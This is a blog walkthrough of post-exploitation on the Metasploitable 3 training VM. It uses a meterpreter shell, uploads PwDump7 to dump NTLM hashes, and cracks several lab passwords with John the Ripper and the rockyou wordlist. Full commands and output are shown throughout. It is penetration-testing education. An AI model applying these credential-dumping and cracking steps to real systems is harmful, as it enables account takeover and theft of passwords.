---
layout: post
title: "Metasploitable 3 - Hashdump without Authentication"
date: 2017-01-13T18:53:00.001Z
author: gu4r15sm0
---

## Metasploitable 3

### Getting a Hashdump without Authentication

If you remember, in my [Queen of Hearts](http://gu4r15m0.blogspot.com/2016/12/metasploitable-3-queen-of-hearts-ok-i.html) post, I exploited vulnerability [CVE-2014-3120](http://www.cvedetails.com/cve/cve-2014-3120) in Elasticsearch and sent a java/meterpreter/reverse_tcp payload.

Going back to that session we can see the meterpreter commands available.


```bash
msf exploit(script_mvel_rce) > sessions

Active sessions
===============
  Id  Type                      Information                         Connection
  --  ----                      -----------                         ----------
  2   meterpreter java/windows  METASPLOITABLE3$ @ metasploitable3  10.23.10.200:4467 -> 10.20.10.23:49393 (10.20.10.23)
msf exploit(script_mvel_rce) > sessions 2
[\*] Starting interaction with 2...
This UID result doesn't help much.

meterpreter > getuid
Server username: METASPLOITABLE3$
```

Let's see if a shell gives more details (you already know this from the Queen of Hearts though.

```bash
meterpreter > shell
Process 6 created.
Channel 12 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\Program Files\elasticsearch-1.1.1>whoami
whoami
nt authority\system
```

I got SYSTEM! because Elasticsearch is running under the System account and so are the java processes supporting it.

```bash
meterpreter > ps
...
1528  elasticsearch-service-x64.exe  NT AUTHORITY\SYSTEM            elasticsearch-service-x64.exe
...
Looking at the commands, I don't have much else, this meterpreter payload doesn't include a hashdump command, so I have to push another tool to get the hash dumps.
meterpreter > help
Core Commands
=============
    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Drop into irb scripting mode
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session.
    transport                 Change the current transport mechanism
    use                       Deprecated alias for 'load'
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel
Stdapi: File system Commands
============================
    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    cp            Copy source to destination
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    lcd           Change local working directory
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    pwd           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    upload        Upload a file or directory
Stdapi: Networking Commands
===========================
    Command       Description
    -------       -----------
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    portfwd       Forward a local port to a remote service
    route         View and modify the routing table
Stdapi: System Commands
=======================
    Command       Description
    -------       -----------
    execute       Execute a command
    getenv        Get one or more environment variable values
    getuid        Get the user that the server is running as
    localtime     Displays the target system's local date and time
    ps            List running processes
    shell         Drop into a system command shell
    sysinfo       Gets information about the remote system, such as OS
Stdapi: User interface Commands
===============================
    Command       Description
    -------       -----------
    screenshot    Grab a screenshot of the interactive desktop
Stdapi: Webcam Commands
=======================
    Command       Description
    -------       -----------
    record_mic    Record audio from the default microphone for X seconds
```


I chose the infamous PwDump7, I downloaded it with wget, if you try to use a web browser (Chrome) it will complain that this is a dangerous site and won't let you download it.

[![](/assets/images/PwDump-tarasco-org.jpg)](/assets/images/PwDump-tarasco-org.jpg)

Chrome's warning as you visit Tarasco dot Org

[![](/assets/images/pwdump7-download.jpg)](/assets/images/pwdump7-download.jpg)

Chrome doesn't let me download PwDump7.zip


```bash
root@pentester:~# wget http://www.tarasco.org/security/pwdump_7/pwdump7.zip
\--2017-01-12 23:29:07--  http://www.tarasco.org/security/pwdump_7/pwdump7.zip
```

Resolving www.tarasco.org (www.tarasco.org)... 104.27.152.39, 104.27.153.39, 2400:cb00:2048:1::681b:9927, ...
Connecting to www.tarasco.org (www.tarasco.org)|104.27.152.39|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 516936 (505K) [application/zip]
Saving to: ‘pwdump7.zip’
pwdump7.zip            100%[===========================>] 504.82K  3.00MB/s    in 0.2s
2017-01-12 23:29:07 (3.00 MB/s) - ‘pwdump7.zip’ saved [516936/516936]
I unzipped it just to get the binaries, and used the upload command from metrpreter to put a copy into the C:\\tmp directory

```bash
root@pentester:~# unzip pwdump7.zip
Archive:  pwdump7.zip
  inflating: PwDump7.exe
  inflating: readme.txt
  inflating: libeay32.dll
meterpreter > upload libeay32.dll /tmp/
[\*] uploading  : libeay32.dll -> /tmp/
[\*] uploaded   : libeay32.dll -> /tmp/\libeay32.dll
meterpreter > upload PwDump7.exe /tmp
[\*] uploading  : PwDump7.exe -> /tmp
[\*] uploaded   : PwDump7.exe -> /tmp\PwDump7.exe
Get a shell again to execute the PwDump7.exe
meterpreter > shell
Process 6 created.
Channel 12 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\Program Files\elasticsearch-1.1.1>cd\tmp
cd\tmp
C:\tmp>dir
dir
 Volume in drive C is Windows 2008R2
 Volume Serial Number is 04FB-56FF
 Directory of C:\tmp
01/12/2017  08:37 PM    <DIR>          .
01/12/2017  08:37 PM    <DIR>          ..
01/12/2017  08:37 PM         1,017,344 libeay32.dll
01/12/2017  08:37 PM            77,824 PwDump7.exe
12/17/2016  11:55 AM             3,147 vagrant-elevated-shell.ps1
12/17/2016  11:55 AM               116 vagrant-shell.cmd
12/17/2016  12:01 PM                27 vagrant-shell.ps1
               5 File(s)      1,098,458 bytes
               2 Dir(s)  47,570,485,248 bytes free
C:\tmp>PwDump7.exe
PwDump7.exe
Pwdump v7.1 - raw password extractor
Author: Andres Tarasco Acuna
url: http://www.514.es
```

Administrator:500:NO PASSWORD\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*:**E02BC503339D51F71D913C245D35B50B**:::
Guest:501:NO PASSWORD\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*:NO PASSWORD\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*:::
vagrant:1000:NO PASSWORD\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*:**E02BC503339D51F71D913C245D35B50B**:::
sshd:1001:NO PASSWORD\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*:NO PASSWORD\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*:::
sshd_server:1002:NO PASSWORD\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*:8D0A16CFC061C3359DB455D00EC27035:::
leah_organa:1003:NO PASSWORD\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*:8AE6A810CE203621CF9CFA6F21F14028:::
luke_skywalker:1004:NO PASSWORD\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*:481E6150BDE6998ED22B0E9BAC82005A:::
han_solo:1005:NO PASSWORD\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*:33ED98C5969D05A7C15C25C99E3EF951:::
artoo_detoo:1006:NO PASSWORD\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*:FAC6AADA8B7AFC418B3AFEA63B7577B4:::
c_three_pio:1007:NO PASSWORD\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*:0FD2EB40C4AA690171BA066C037397EE:::
ben_kenobi:1008:NO PASSWORD\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*:4FB77D816BCE7AEEE80D7C2E5E55C859:::
darth_vader:1009:NO PASSWORD\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*:B73A851F8ECFF7ACAFBAA4A806AEA3E0:::
anakin_skywalker:1010:NO PASSWORD\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*:C706F83A7B17A0230E55CDE2F3DE94FA:::
jarjar_binks:1011:NO PASSWORD\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*:EC1DCD52077E75AEF4A1930B0917C4D4:::
lando_calrissian:1012:NO PASSWORD\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*:62708455898F2D7DB11CFB670042A53F:::
boba_fett:1013:NO PASSWORD\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*:D60F9A4859DA4FEADAF160E97D200DC9:::
jabba_hutt:1014:NO PASSWORD\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*:93EC4EAA63D63565F37FE7F28D99CE76:::
greedo:1015:NO PASSWORD\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*:CE269C6B7D9E2F1522B44686B49082DB:::
chewbacca:1016:NO PASSWORD\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*:E7200536327EE731C7FE136AF4575ED8:::
kylo_ren:1017:NO PASSWORD\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*:74C0A3DD06613D3240331E94AE18B001:::
C:\tmp>
As you can see from the HASHDUMP, both the Administrator's and the vagrant's hashes are the same, that means both users have the same password, and if you read all the [instructions about metasploitable 3](https://community.rapid7.com/community/metasploit/blog/2016/11/15/test-your-might-with-the-shiny-new-metasploitable3), you should know the password. But I'll crack it anyway since these look like NTLMv1 passwords.
I copy the passwords in a file I called pwdump and run John the Ripper on it with the Rockyou world list and basic mangling rules, and cross my fingers 🤞

```bash
root@pentester:~/metasploitable3# john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT pwdump --rules --pot=pwdump.pot
Using default input encoding: UTF-8
Rules/masks using ISO-8859-1
Loaded 17 password hashes with no different salts (NT [MD4 128/128 XOP 4x2])
Press 'q' or Ctrl-C to abort, almost any other key for status
vagrant          (Administrator)
pr0t0c0l         (c_three_pio)
mandalorian1     (boba_fett)
3g 0:00:02:24 DONE (2017-01-13 13:19) 0.02072g/s 1614Kp/s 1614Kc/s 22846KC/s Aaaaaaaqqqqqqqing..Aaaaaaaaaaaaing
Warning: passwords printed above might not be all those cracked
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@pentester:~/metasploitable3# john -show pwdump
```

**Administrator:vagrant**:500:NO PASSWORD\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*:E02BC503339D51F71D913C245D35B50B:::
Guest:NO PASSWORD:501:NO PASSWORD\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*:NO PASSWORD\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*:::
**vagrant:vagrant**:1000:NO PASSWORD\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*:E02BC503339D51F71D913C245D35B50B:::
sshd:NO PASSWORD:1001:NO PASSWORD\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*:NO PASSWORD\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*:::
**c_three_pio:pr0t0c0l**:1007:NO PASSWORD\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*:0FD2EB40C4AA690171BA066C037397EE:::
**boba_fett:mandalorian1**:1013:NO PASSWORD\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*:D60F9A4859DA4FEADAF160E97D200DC9:::
6 password hashes cracked, 14 left
So I actually got 3 passwords for four different users. 👍
I'm pretty sure playing with the John the Ripper mangling rules could get me more by using the Rockyou word list, but that might be for another post when I learn more about how to build rules, the cool thing is that I have a nice set of hashes to play with🙂
Next step is to incorporate the passwords and hashes to my Metasploit workspace creds table so I have them available for other exploits. I will do that with another post where I'll get a hashdump with authentication and use the metasploit JtR module to crack them also.
Enjoy!